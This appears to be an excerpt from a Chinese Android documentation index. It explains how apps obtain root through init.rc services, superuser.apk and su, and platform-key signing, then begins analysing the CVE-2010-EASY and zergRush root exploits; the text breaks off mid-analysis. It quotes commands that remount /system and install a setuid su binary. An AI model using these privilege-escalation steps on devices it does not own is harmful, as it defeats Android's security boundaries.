\u6700\u540e\u5728\u81ea\u5df1\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u8bfb\u53d6\u201cinit.svc.mount_nfs\u201dAndroid\u7cfb\u7edfProperty\uff0c\u68c0\u67e5\u6267\u884c\u7ed3\u679c\u3002\u4ee3\u7801\u5982\u4e0b\uff1a 1:while(true) 2: { 3: mount_rt = SystemProperties.get(\"init.svc.mount_nfs\",\"\"); 4: if(mount_rt != null && mount_rt.equals(\"stopped\")) 5: { 6: return true; 7: } 8: 9: try 10: { 11: Thread.sleep(1000); 12: }catch(Exception ex){ 13: Log.e(TAG,\"Exception: \" + ex.getMessage()); 14: } 15: } init\u8fdb\u7a0b\u7ef4\u62a4\u4e00\u4e2aservice\u7684\u961f\u5217\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8f6e\u8bad\u6765\u67e5\u8be2service\u7684\u6267\u884c\u7ed3\u679c\u3002 1. \u6587\u4ef6(\u5939)\u8bfb\u5199\u6743\u9650 init.rc \u4e2d\u5efa\u7acbtest1 test2 test3\u6587\u4ef6\u5939 mkdir /data/misc/test1 0770 root root mkdir /data/misc/test2 0770 wifi wifi mkdir /data/misc/test3 0770 system misc \u5176\u4e2d test1 \u76ee\u5f55\u7684owner\u662froot, group\u4e5f\u662froot test2 \u76ee\u5f55\u7684owner\u662fwifi , group\u4e5f\u662fwifi test3 \u76ee\u5f55\u7684owner\u662fsystem , group\u662fmisc \uff08\u4efb\u4f55\u7528\u6237\u90fd\u5c5e\u4e8egroup misc\uff09 service xxxx /system/bin/xxxx user root disabled oneshot service yyyy /system/bin/yyyy user system disabled oneshot service zzzz /system/bin/zzzz user wifi disabled oneshot \u7ed3\u679c: xxxx \u670d\u52a1\u53ef\u4ee5\u8bbf\u95ee test1, test2, test3 yyyy \u670d\u52a1\u53ef\u4ee5\u8bbf\u95ee test3 zzzz \u670d\u52a1\u53ef\u4ee5\u8bbf\u95ee test2, test3 \u89c1android_filesystem_config.h\u4e2d\u5b9a\u4e49AID_ROOT AID_SYSTEM AID_MISC\u7b49\u5b8f\u5b9a\u4e49\u7684\u6743\u9650 360\u7b49\u7279\u6b8a\u7cfb\u7edf\u662f\u5426\u53ef\u4ee5\u8003\u8651\u5728AID_ROOT\u548cAID_SYSTEM\u4e4b\u95f4\u52a0\u4e00\u4e2a\u6743\u9650\u548c\u7528\u6237,\u589e\u52a0\u65b0\u7684\u54e6 property\u7ed9360\u7528?**** \u901a\u8fc7\u4e0a\u9762\u7684\u8fd9\u4e9b\u6b65\u9aa4\uff0cAndroid\u5e94\u7528\u7a0b\u5e8f\u5c31\u80fd\u591f\u8c03\u7528init.rc\u4e2d\u5b9a\u4e49\u7684Service\u4e86\u3002\u8fd9\u6837\u4f60\u7684Android\u5e94\u7528\u7a0b\u5e8f\u4e5f\u5c31\u83b7\u5f97\u4e86root\u6743\u9650\u3002\u524d\u63d0\u662fAndroid\u7cfb\u7edf\u5f00\u53d1\u4eba\u5458\uff0c\u5426\u5219\u4f60\u65e0\u6cd5\u4fee\u6539init.rc\u7b49\u6587\u4ef6,\u800c\u4e14\u5e94\u7528\u7a0b\u5e8f\u5fc5\u987b\u8981\u83b7\u5f97system\u6743\u9650\u3002","title":"Android\u5e94\u7528\u7a0b\u5e8f\u5229\u7528init.rc service\u83b7\u5f97root\u6743\u9650"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#android-superuserapkroot","text":"\u539f\u7406\u662f\u5229\u7528\u4e86android\u7684\u4e24\u4e2a\u63d0\u6743\u6f0f\u6d1e\uff1a CVE-2010-EASY\u548c ZergRush\u3002 \u6211\u628a\u5927\u6982\u539f\u7406\u7b80\u5355\u8bf4\u8bf4\uff1a 1\uff0c CVE-2010-EASY\uff1a linux\u7684\u5185\u6838\u7684\u6a21\u5757\u5316\u7a0b\u5ea6\u5f88\u9ad8\uff0c\u5f88\u591a\u529f\u80fd\u6a21\u5757\u662f\u9700\u8981\u5230\u65f6\u5019\u518d\u52a0\u8f7d\uff0c\u5728 android\u4e2d\u7531init\u8fdb\u7a0b\u6765\u7ba1\u7406\u8fd9\u4e9b\u7684\u3002\u4f46\u662f\u8fd9\u4e2ainit\u8fdb\u7a0b\u4e0d\u4f1a\u68c0\u6d4b\u53d1\u7ed9\u5b83\u7684\u6307\u4ee4\u7684\u6765\u6e90\uff0c\u4e0d\u7ba1\u662f\u5185\u6838\u53d1\u9001\u7684\uff0c\u8fd8\u662f\u7528\u6237\u53d1\u9001\u7684\uff0c\u5b83\u90fd\u6267\u884c\u4e0d\u8bef\uff0c\u4f1a\u987a\u4ece\u7684\u53bb\u52a0\u8f7d\u6216\u5378\u8f7d\u4e00\u4e9b\u6a21\u5757\uff0c\u800c\u52a0\u8f7d\u7684\u6a21\u5757\u90fd\u662f\u4ee5root\u8eab\u4efd\u8fd0\u884c\u7684\u3002\u56e0\u6b64\u4f60\u53ef\u4ee5\u7ed9\u5b83\u51c6\u5907\u4e00\u4e2a\u7cbe\u5fc3\u5236\u4f5c\u7684\u529f\u80fd\u6a21\u5757(ko\u6587\u4ef6)\uff0c\u7136\u540e\u89e6\u53d1\u76f8\u5e94\u7684\u52a0\u8f7d\u6761\u4ef6\uff0c\u6bd4\u5982\u70ed\u62d4\u63d2\u3001\u5f00\u5173wifi\u7b49\u7b49\uff0c \u8be5\u529f\u80fd\u6a21\u5757\u8fd0\u884c\u540e\uff0c\u4f1a\u751f\u6210 /data/local/tmp/rootshell \u4e00\u4e2a\u5e26s\u4f4d\u7684shell\u3002 2\uff0cZergRush\u539f\u7406\uff1a \u5177\u6709root\u6743\u9650\u7684vold\u8fdb\u7a0b\u4f7f\u7528\u4e86libsysutils.so\u5e93\uff0c\u8be5\u5e93\u6709\u4e2a\u51fd\u6570\u5b58\u5728\u6808\u6ea2\u51fa\uff0c\u56e0\u6b64\u53ef\u4ee5root\u6743\u9650\u6267\u884c\u8f93\u5165\u7684shellcode\u3002 3. \u8fd8\u6709\u4e2a\u524d\u9762\u63d0\u5230\u7684adb\u63d0\u6743\u6f0f\u6d1e\uff0c\u4e0d\u591f\u65b0\u7248\u672c\u5df2\u7ecf\u4fee\u6b63\u4e86\u3002 \u626f\u4e86\u534a\u5929\u8fd8\u6ca1\u626f\u5230superuser.apk\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u662froot\u6210\u529f\u540e\uff0c\u4e13\u95e8\u7528\u6765\u7ba1\u7406root\u6743\u9650\u4f7f\u7528\u7684\uff0c\u9632\u6b62\u88ab\u6076\u610f\u7a0b\u5e8f\u6ee5\u7528\u3002 \u6e90\u7801\u5730\u5740\uff1a http://superuser.googlecode.com/svn/trunk \u5e26\u7740\u4e24\u4e2a\u95ee\u9898\u6211\u4eec\u6765\u5206\u6790\u6e90\u7801\uff1a 1\u3001superuser\u662f\u600e\u4e48\u77e5\u9053\u8c01\u60f3\u7528root\u6743\u9650\uff1f 2\u3001superuser\u662f\u5982\u4f55\u628a\u7528\u6237\u7684\u9009\u62e9\u544a\u8bc9su\u7a0b\u5e8f\u7684\u90a3\uff1f \u5373superuser\u548csu\u7a0b\u5e8f\u662f\u5982\u4f55\u901a\u8baf\u7684\uff0c\u4ed6\u4eec\u4fe9\u4f4d\u4e8e\u4e0d\u901a\u7684\u65f6\u7a7a\uff0c\u4e00\u4e2a\u5728java\u865a\u62df\u673a\u4e2d\uff0c\u4e00\u4e2a\u5728linux\u7684\u771f\u5b9e\u8fdb\u7a0b\u4e2d\u3002 \u5171\u6709\u4e24\u4e2aactive: SuperuserActivity\u548c SuperuserRequestActivity\u3002 \u5176\u4e2dSuperuserActivity\u4e3b\u8981\u662f\u7528\u6765\u7ba1\u7406\u767d\u540d\u5355\u7684\uff0c\u5c31\u662f\u8bb0\u4f4f\u54ea\u4e2a\u7a0b\u5e8f\u5df2\u7ecf\u88ab\u5141\u8bb8\u4f7f\u7528root\u6743\u9650\u4e86\uff0c\u7701\u7684\u6bcf\u6b21\u7528\u65f6\u90fd\u95ee\u7528\u6237\u3002 SuperuserRequestActivity \u5c31\u662f\u7528\u6765\u8be2\u95ee\u7528\u6237\u76ee\u524d\u6709\u4e2a\u7a0b\u5e8f\u60f3\u4f7f\u7528root\u6743\u9650\uff0c\u662f\u5426\u5141\u8bb8\uff0c\u662f\u5426\u4e00\u76f4\u5141\u8bb8\uff0c\u5373\u653e\u5165\u767d\u540d\u5355\u3002 \u8fd9\u4e2a\u767d\u540d\u5355\u6bd4\u8f83\u5173\u952e\uff0c\u662f\u4e00\u4e2asqlite\u6570\u636e\u5e93\u6587\u4ef6\uff0c\u4f4d\u7f6e\uff1a /data/data/com.koushikdutta.superuser/databases/superuser.sqlite root\u7684\u672c\u8d28\u5c31\u662f\u5f80 /system/bin/\u4e0b\u653e\u4e00\u4e2a\u5e26s\u4f4d\u7684\uff0c\u4e0d\u68c0\u67e5\u8c03\u7528\u8005\u6743\u9650\u7684su\u6587\u4ef6\u3002\u666e\u901a\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u8be5su\u6765\u8fd0\u884croot\u6743\u9650\u7684\u547d\u4ee4\u3002superuser.apk\u4e2d\u5c31\u81ea\u5e26\u4e86\u4e00\u4e2a\u8fd9\u6837\u7684su\u7a0b\u5e8f\u3002\u4e00\u5f00\u59cbsuperuser\u4f1a\u68c0\u6d4b/system/bin/su\u662f\u5426\u5b58\u5728\uff0c\u662f\u5426\u662f\u81ea\u4e2a\u653e\u8fdb\u53bb\u7684su: File su = new File(\"/system/bin/su\"); // \u68c0\u6d4bsu\u6587\u4ef6\u662f\u5426\u5b58\u5728,\u5982\u679c\u4e0d\u5b58\u5728\u5219\u76f4\u63a5\u8fd4\u56de if (!su.exists()) { Toast toast = Toast.makeText(this, \"Unable to find /system/bin/su.\", Toast.LENGTH_LONG); toast.show(); return; } //\u68c0\u6d4bsu\u6587\u4ef6\u7684\u5b8c\u6574\u6027\uff0c\u6bd4\u8f83\u5927\u5c0f\uff0c\u592a\u7701\u4e8b\u4e86\u5427 //\u5982\u679c\u5927\u5c0f\u4e00\u6837\uff0c\u5219\u8ba4\u4e3asu\u6587\u4ef6\u6b63\u786e\uff0c\u76f4\u63a5\u8fd4\u56de\u4e86\u4e8b\u3002 if (su.length() == suStream.available()) { suStream.close(); return; } // \u5982\u679c\u68c0\u6d4b\u5230/system/bin/su \u6587\u4ef6\u5b58\u5728\uff0c\u4f46\u662f\u4e0d\u5bf9\u5934\uff0c\u5219\u628a\u81ea\u5e26\u7684su\u5148\u5199\u5230\"/data/data/com.koushikdutta.superuser/su\" // \u518d\u5199\u5230/system/bin/su\u3002 byte[] bytes = new byte[suStream.available()]; DataInputStream dis = new DataInputStream(suStream); dis.readFully(bytes); FileOutputStream suOutStream = new FileOutputStream(\"/data/data/com.koushikdutta.superuser/su\"); suOutStream.write(bytes); suOutStream.close(); Process process = Runtime.getRuntime().exec(\"su\"); DataOutputStream os = new DataOutputStream(process.getOutputStream()); os.writeBytes(\"mount -oremount,rw /dev/block/mtdblock3 /system\\n\"); os.writeBytes(\"busybox cp /data/data/com.koushikdutta.superuser/su /system/bin/su\\n\"); os.writeBytes(\"busybox chown 0:0 /system/bin/su\\n\"); os.writeBytes(\"chmod 4755 /system/bin/su\\n\"); os.writeBytes(\"exit\\n\"); os.flush(); \u4e0a\u9762\u63d0\u5230\u7684su\u80af\u5b9a\u662f\u52a8\u8fc7\u624b\u811a\u7684,\u6709\u8fdb\u7a0b\u4f7f\u7528root\u6743\u9650\uff0csuperuser\u662f\u600e\u4e48\u77e5\u9053\u7684\uff0c\u770b\u5b8csu\u7684\u4ee3\u7801\u660e\u767d\u4e86\uff0c\u5173\u952e\u662f\u53e5\uff1a sprintf(sysCmd, \"am start -a android.intent.action.MAIN -n com.koushikdutta.superuser/com.koushikdutta.superuser.SuperuserRequestActivity --ei uid %d --ei pid %d > /dev/null\", g_puid, ppid); if (system(sysCmd)) return executionFailure(\"am.\"); \u539f\u7406\u662fam\u547d\u4ee4\uff0c\u770b\u4e86\u4e0bam\u7684\u7528\u6cd5\uff0c\u660e\u767d\u4e86\uff1a \u5728Android\u4e2d\uff0c\u9664\u4e86\u4ece\u754c\u9762\u4e0a\u542f\u52a8\u7a0b\u5e8f\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u4ece\u547d\u4ee4\u884c\u542f\u52a8\u7a0b\u5e8f\uff0c\u4f7f\u7528\u7684\u662f\u547d\u4ee4\u884c\u5de5\u5177am.\u542f\u52a8\u7684\u65b9\u6cd5\u4e3a $ adb shell $ su # am start -n \uff5b\u5305(package)\u540d\uff5d/\uff5b\u5305\u540d\uff5d.{\u6d3b\u52a8(activity)\u540d\u79f0} \u7a0b\u5e8f\u7684\u5165\u53e3\u7c7b\u53ef\u4ee5\u4ece\u6bcf\u4e2a\u5e94\u7528\u7684AndroidManifest.xml\u7684\u6587\u4ef6\u4e2d\u5f97\u5230\uff0c\u4ee5\u8ba1\u7b97\u5668\uff08calculator\uff09\u4e3a\u4f8b\uff0c\u5b83\u7684 <manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" \u2026 package=\"com.android.calculator2\" \u2026>\u2026 \u7531\u6b64\u8ba1\u7b97\u5668\uff08calculator\uff09\u7684\u542f\u52a8\u65b9\u6cd5\u4e3a\uff1a # am start -n com.android.calculator2/com.android.calculator2.Calculator \u4e00\u822c\u60c5\u51b5\u5e0c\u671b\uff0c\u4e00\u4e2aAndroid\u5e94\u7528\u5bf9\u5e94\u4e00\u4e2a\u5de5\u7a0b\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6709\u4e00\u4e9b\u5de5\u7a0b\u5177\u6709\u591a\u4e2a\u6d3b\u52a8\uff08activity\uff09\uff0c\u800c\u6709\u4e00\u4e9b\u5e94\u7528\u4f7f\u7528\u4e00\u4e2a\u5de5\u7a0b\u3002\u4f8b\u5982\uff1a\u5728Android\u754c\u9762\u4e2d\uff0cMusic\u548cVideo\u662f\u4e24\u4e2a\u5e94\u7528\uff0c\u4f46\u662f\u5b83\u4eec\u4f7f\u7528\u7684\u90fd\u662fpackages/apps/Music\u8fd9\u4e00\u4e2a\u5de5\u7a0b\u3002\u800c\u5728\u8fd9\u4e2a\u5de5\u7a0b\u7684AndroidManifest.xml\u6587\u4ef6\u4e2d\uff0c\u6709\u5305\u542b\u4e86\u4e0d\u540c\u7684\u6d3b\u52a8\uff08activity\uff09\u3002 Music \u548c Video\uff08\u97f3\u4e50\u548c\u89c6\u9891\uff09\u7684\u542f\u52a8\u65b9\u6cd5\u4e3a\uff1a # am start -n com.android.music/com.android.music.MusicBrowserActivity # am start -n com.android.music/com.android.music.VideoBrowserActivity # am start -n com.android.music/com.android.music.MediaPlaybackActivity \u542f\u52a8\u6d4f\u89c8\u5668 : am start -a android.intent.action.VIEW -d http://www.google.cn/ \u62e8\u6253\u7535\u8bdd : am start -a android.intent.action.CALL -d tel:10086 \u542f\u52a8 google map\u76f4\u63a5\u5b9a\u4f4d\u5230\u5317\u4eac : am start -a android.intent.action.VIEW geo:0,0?q=beijing usage: am [subcommand] [options] start an Activity: am start [-D] [-W] <INTENT> -D: enable debugging -W: wait for launch to complete start a Service: am startservice <INTENT> send a broadcast Intent: am broadcast <INTENT> start an Instrumentation: am instrument [flags] <COMPONENT> -r: print raw results (otherwise decode REPORT_KEY_STREAMRESULT) -e <NAME> <VALUE>: set argument <NAME> to <VALUE> -p <FILE>: write profiling data to <FILE> -w: wait for instrumentation to finish before returning start profiling: am profile <PROCESS> start <FILE> stop profiling: am profile <PROCESS> stop <INTENT> specifications include these flags: [-a <ACTION>] [-d <DATA_URI>] [-t <MIME_TYPE>] [-c <CATEGORY> [-c <CATEGORY>] ...] [-e|--es <EXTRA_KEY> <EXTRA_STRING_VALUE> ...] [--esn <EXTRA_KEY> ...] [--ez <EXTRA_KEY> <EXTRA_BOOLEAN_VALUE> ...] [-e|--ei <EXTRA_KEY> <EXTRA_INT_VALUE> ...] [-n <COMPONENT>] [-f <FLAGS>] [--grant-read-uri-permission] [--grant-write-uri-permission] [--debug-log-resolution] [--activity-brought-to-front] [--activity-clear-top] [--activity-clear-when-task-reset] [--activity-exclude-from-recents] [--activity-launched-from-history] [--activity-multiple-task] [--activity-no-animation] [--activity-no-history] [--activity-no-user-action] [--activity-previous-is-top] [--activity-reorder-to-front] [--activity-reset-task-if-needed] [--activity-single-top] [--receiver-registered-only] [--receiver-replace-pending] [<URI>] \u8fd8\u6709\u4e2a\u7591\u70b9\uff0c\u5c31\u662fsu\u600e\u4e48\u77e5\u9053\u7528\u6237\u662f\u5141\u8bb8root\u6743\u9650\u8fd8\u662f\u53cd\u5bf9\u90a3\uff1f\u539f\u6765\u662f\u4e0a\u9762\u63d0\u5230\u7684\u767d\u540d\u5355\u8d77\u6765\u4f5c\u7528\uff0csuperuser\u628a\u7528\u6237\u7684\u9009\u62e9\u653e\u5165 \uff1a /data/data/com.koushikdutta.superuser/databases/superuser.sqlite \u6570\u636e\u5e93\u4e2d\uff0c\u7136\u540esu\u8fdb\u7a0b\u518d\u53bb\u8bfb\u8be5\u6570\u636e\u5e93\u6765\u5224\u65ad\u662f\u5426\u5141\u8bb8\u3002 static int checkWhitelist() { sqlite3 *db; int rc = sqlite3_open_v2(DBPATH, &db, SQLITE_OPEN_READWRITE, NULL); if (!rc) { char *errorMessage; char query[1024]; sprintf(query, \"select * from whitelist where _id=%d limit 1;\", g_puid); struct whitelistCallInfo callInfo; callInfo.count = 0; callInfo.db = db; rc = sqlite3_exec(db, query, whitelistCallback, &callInfo, &errorMessage); if (rc != SQLITE_OK) { sqlite3_close(db); return 0; } sqlite3_close(db); return callInfo.count; } sqlite3_close(db); return 0; }","title":"android superuser.apk\u7ba1\u7406root\u6743\u9650\u539f\u7406\u5206\u6790"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#root","text":"| \u8f6c\u81ea: http://blog.csdn.net/liujian885/archive/2010/03/22/5404834.aspx \u5728 android\u7684API\u4e2d\u6709\u63d0\u4f9b SystemClock.setCurrentTimeMillis()\u51fd\u6570\u6765\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\uff0c\u53ef\u60dc\u65e0\u8bba\u4f60\u600e\u4e48\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u90fd\u662f\u6ca1\u7528\u7684\uff0c\u65e0\u8bba\u6a21\u62df\u5668\u8fd8\u662f\u771f\u673a\uff0c\u5728logcat\u4e2d\u603b\u4f1a\u5f97\u5230\"Unable to open alarm driver: Permission denied \".\u8fd9\u4e2a\u51fd\u6570\u9700\u8981root\u6743\u9650\u6216\u8005\u8fd0\u884c\u4e0e\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u624d\u53ef\u4ee5\u7528\u3002\u672c\u6765\u4ee5\u4e3a\u5c31\u6ca1\u6709\u529e\u6cd5\u5728\u5e94\u7528\u7a0b\u5e8f\u8fd9\u4e00\u5c42\u6539\u7cfb\u7edf\u65f6\u95f4\u4e86\uff0c\u540e\u6765\u5728\u7f51\u4e0a\u641c\u4e86\u597d\u4e45\uff0c\u77e5\u9053\u8fd9\u4e2a\u76ee\u7684\u8fd8\u662f\u53ef\u4ee5\u8fbe\u5230\u7684\u3002 \u7b2c\u4e00\u4e2a\u65b9\u6cd5\u7b80\u5355\u70b9\uff0c\u4e0d\u8fc7\u9700\u8981\u5728Android\u7cfb\u7edf\u6e90\u7801\u7684\u73af\u5883\u4e0b\u7528make\u6765\u7f16\u8bd1\uff1a 1. \u5728\u5e94\u7528\u7a0b\u5e8f\u7684AndroidManifest.xml\u4e2d\u7684manifest\u8282\u70b9\u4e2d\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4fee\u6539Android.mk\u6587\u4ef6\uff0c\u52a0\u5165LOCAL_CERTIFICATE := platform\u8fd9\u4e00\u884c 3. \u4f7f\u7528mm\u547d\u4ee4\u6765\u7f16\u8bd1\uff0c\u751f\u6210\u7684apk\u5c31\u6709\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u7684\u6743\u9650\u4e86\u3002 \u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u9ebb\u70e6\u70b9\uff0c\u4e0d\u8fc7\u4e0d\u7528\u5f00\u865a\u62df\u673a\u8dd1\u5230\u6e90\u7801\u73af\u5883\u4e0b\u7528make\u6765\u7f16\u8bd1\uff1a 1. \u540c\u4e0a\uff0c\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4f7f\u7528eclipse\u7f16\u8bd1\u51faapk\u6587\u4ef6\uff0c\u4f46\u662f\u8fd9\u4e2aapk\u6587\u4ef6\u662f\u4e0d\u80fd\u7528\u7684\u3002 3. \u4f7f\u7528\u76ee\u6807\u7cfb\u7edf\u7684platform\u5bc6\u94a5\u6765\u91cd\u65b0\u7ed9apk\u6587\u4ef6\u7b7e\u540d\u3002\u8fd9\u6b65\u6bd4\u8f83\u9ebb\u70e6\uff0c\u9996\u5148\u627e\u5230\u5bc6\u94a5\u6587\u4ef6\uff0c\u5728\u6211\u7684Android\u6e90\u7801\u76ee\u5f55\u4e2d\u7684\u4f4d\u7f6e\u662f\"build\\target\\product\\security\"\uff0c\u4e0b\u9762\u7684platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u7136\u540e\u7528Android\u63d0\u4f9b\u7684Signapk\u5de5\u5177\u6765\u7b7e\u540d\uff0csignapk\u7684\u6e90\u4ee3\u7801\u662f\u5728\"build\\tools\\signapk\"\u4e0b\uff0c\u7528\u6cd5\u4e3a\"signapk platform.x509.pem platform.pk8 input.apk output.apk\"\uff0c\u6587\u4ef6\u540d\u6700\u597d\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u9632\u6b62\u627e\u4e0d\u5230\uff0c\u4e5f\u53ef\u4ee5\u4fee\u6539\u6e90\u4ee3\u7801\u76f4\u63a5\u4f7f\u7528\u3002 \u8fd9\u6837\u6700\u540e\u5f97\u5230\u7684apk\u548c\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u662f\u4e00\u6837\u7684\u3002 \u6700\u540e\u89e3\u91ca\u4e00\u4e0b\u539f\u7406\uff0c\u9996\u5148\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002\u901a\u8fc7Shared User id,\u62e5\u6709\u540c\u4e00\u4e2aUser id\u7684\u591a\u4e2aAPK\u53ef\u4ee5\u914d\u7f6e\u6210\u8fd0\u884c\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u3002\u90a3\u4e48\u628a\u7a0b\u5e8f\u7684UID\u914d\u6210android.uid.system\uff0c\u4e5f\u5c31\u662f\u8981\u8ba9\u7a0b\u5e8f\u8fd0\u884c\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\uff0c\u8fd9\u6837\u5c31\u6709\u6743\u9650\u6765\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u4e86\u3002 \u53ea\u662f\u52a0\u5165UID\u8fd8\u4e0d\u591f\uff0c\u5982\u679c\u8fd9\u65f6\u5019\u5b89\u88c5APK\u7684\u8bdd\u53d1\u73b0\u65e0\u6cd5\u5b89\u88c5\uff0c\u63d0\u793a\u7b7e\u540d\u4e0d\u7b26\uff0c\u539f\u56e0\u662f\u7a0b\u5e8f\u60f3\u8981\u8fd0\u884c\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u8fd8\u8981\u6709\u76ee\u6807\u7cfb\u7edf\u7684platform key\uff0c\u5c31\u662f\u4e0a\u9762\u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u63d0\u5230\u7684platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u7528\u8fd9\u4e24\u4e2akey\u7b7e\u540d\u540eapk\u624d\u771f\u6b63\u53ef\u4ee5\u653e\u5165\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u3002\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u4e2d\u52a0\u5165LOCAL_CERTIFICATE := platform\u5176\u5b9e\u5c31\u662f\u7528\u8fd9\u4e24\u4e2akey\u6765\u7b7e\u540d\u3002 \u8fd9\u4e5f\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u8fd9\u6837\u751f\u6210\u7684\u7a0b\u5e8f\u53ea\u6709\u5728\u539f\u59cb\u7684Android\u7cfb\u7edf\u6216\u8005\u662f\u81ea\u5df1\u7f16\u8bd1\u7684\u7cfb\u7edf\u4e2d\u624d\u53ef\u4ee5\u7528\uff0c\u56e0\u4e3a\u8fd9\u6837\u7684\u7cfb\u7edf\u624d\u53ef\u4ee5\u62ff\u5230platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u8981\u662f\u522b\u5bb6\u516c\u53f8\u505a\u7684Android\u4e0a\u8fde\u5b89\u88c5\u90fd\u5b89\u88c5\u4e0d\u4e86\u3002\u8bd5\u8bd5\u539f\u59cb\u7684Android\u4e2d\u7684key\u6765\u7b7e\u540d\uff0c\u7a0b\u5e8f\u5728\u6a21\u62df\u5668\u4e0a\u8fd0\u884cOK\uff0c\u4e0d\u8fc7\u653e\u5230G3\u4e0a\u5b89\u88c5\u76f4\u63a5\u63d0\u793a\"Package ... has no signatures that match those in shared user android.uid.system\"\uff0c\u8fd9\u6837\u4e5f\u662f\u4fdd\u62a4\u4e86\u7cfb\u7edf\u7684\u5b89\u5168\u3002 \u6700\u6700\u540e\u8fd8\u8bf4\u4e0b\uff0c\u8fd9\u4e2aandroid:sharedUserId\u5c5e\u6027\u4e0d\u53ea\u53ef\u4ee5\u628aapk\u653e\u5230\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u914d\u7f6e\u591a\u4e2aAPK\u8fd0\u884c\u5728\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\uff0c\u8fd9\u6837\u53ef\u4ee5\u5171\u4eab\u6570\u636e\uff0c\u5e94\u8be5\u4f1a\u5f88\u6709\u7528\u7684\u3002 signapk\u7f16\u8bd1\u7ed3\u675f\u540e\u5728 android\u76ee\u5f55\u4e0b/out/host/linux-x86/framework/signapk.jar \u4f7f\u7528\u65b9\u6cd5\uff1ajava -jar signapk.jar platform.x509.pem platform.pk8 test.apk test_signed.apk\u6587\u4ef6\u3002 | \u6f0f\u6d1e \u2014 zergRush \u63d0\u6743\u5b9e\u73b0\u7684\u4ee3\u7801\uff0c\u89c1\uff1a https://github.com/revolutionary/zergRush/blob/master/zergRush.c \u9700\u8981\u4e86\u89e3\u4e00\u4e0b\u662f\u54ea\u4e2a\u5730\u65b9\u6709\u95ee\u9898\uff0c\u8fb9\u5206\u6790\u8fb9\u8bb0\u5f55\u6b64\u6b21\u8fc7\u7a0b\u3002 \u6587\u4ef6\u4e0d\u5927\uff0c\u5f53\u7136\u4ece main \u5165\u624b\u4e86\uff0c if (geteuid() == 0 && getuid() == 0 && strstr(argv[0], \"boomsh\")) do_root(); \u660e\u663e\uff0c\u5f53\u6709\u4e86 Root \u80fd\u529b\u540e\u53bb\u505a\u4e00\u4e2a\u53ef\u4ee5\u4fdd\u6301 Root \u7684\u52a8\u4f5c\uff0c\u731c\u6d4b\uff0c\u6b64\u7a0b\u5e8f\u4f1a\u88ab\u8c03\u7528\u591a\u6b21\uff0c\u5e76\u4e14\u518d\u6b21\u8c03\u7528\u7684\u65f6\u5019\u7a0b\u5e8f\u540d\u79f0\u4e3a boomsh \u770b\u4e00\u4e0b do_root \u5427 \u5199\u4e86\u4e00\u4e2a\u5c5e\u6027 ro.kernel.qemu \u4e3a 1 \u660e\u663e\u662f\u8ba9\u624b\u673a\u5f53\u6210\u6a21\u62df\u5668\u8fd0\u884c\uff0c\u89c1 \\android2.32\\system\\core\\adb\\adb.c \u4e2d\u7684\u4ee3\u7801 1. /* run adbd in secure mode if ro.secure is set and 2. ** we are not in the emulator 3. */ 4. property_get(\"ro.kernel.qemu\", value, \"\"); 5. if (strcmp(value, \"1\") != 0) { 6. property_get(\"ro.secure\", value, \"\"); 7. if (strcmp(value, \"1\") == 0) { 8. // don't run as root if ro.secure is set... 9. secure = 1; 10. 11. // ... except we allow running as root in userdebug builds if the 12. // service.adb.root property has been set by the \"adb root\" command 13. property_get(\"ro.debuggable\", value, \"\"); 14. if (strcmp(value, \"1\") == 0) { 15. property_get(\"service.adb.root\", value, \"\"); 16. if (strcmp(value, \"1\") == 0) { 17. secure = 0; 18. } 19. } 20. } 21. } \u4ee5\u540e\u8c03\u7528 adb \u9ed8\u8ba4\u662f Root \u7528\u6237\u4e86\u3002 \u4e0b\u9762\u53c8\u505a\u4e86\u4e00\u4ef6\u4e8b\u628a\u81ea\u5df1\u62f7\u8d1d\u5230 /data/local/tmp/boomsh \u628a SH \u62f7\u8d1d\u5230 /data/local/tmp/sh \u6539\u53d8 /data/local/tmp/boomsh \u7684\u6743\u9650\u4e3a 711 \uff0c\u53ef\u6267\u884c\u4e86 \u7136\u540e\u83b7\u53d6 /system/bin/vold \u7a0b\u5e8f\u7684\u5927\u5c0f\uff0c \u901a\u8fc7 heap_addr = ((((st.st_size) + 0x8000) / 0x1000) + 1) * 0x1000; \u8fd9\u6837\u7684\u4e00\u4e2a\u8ba1\u7b97\uff0c\u5f97\u5230\u8be5\u7a0b\u5e8f\u7684\u5806\u5730\u5740\uff0c 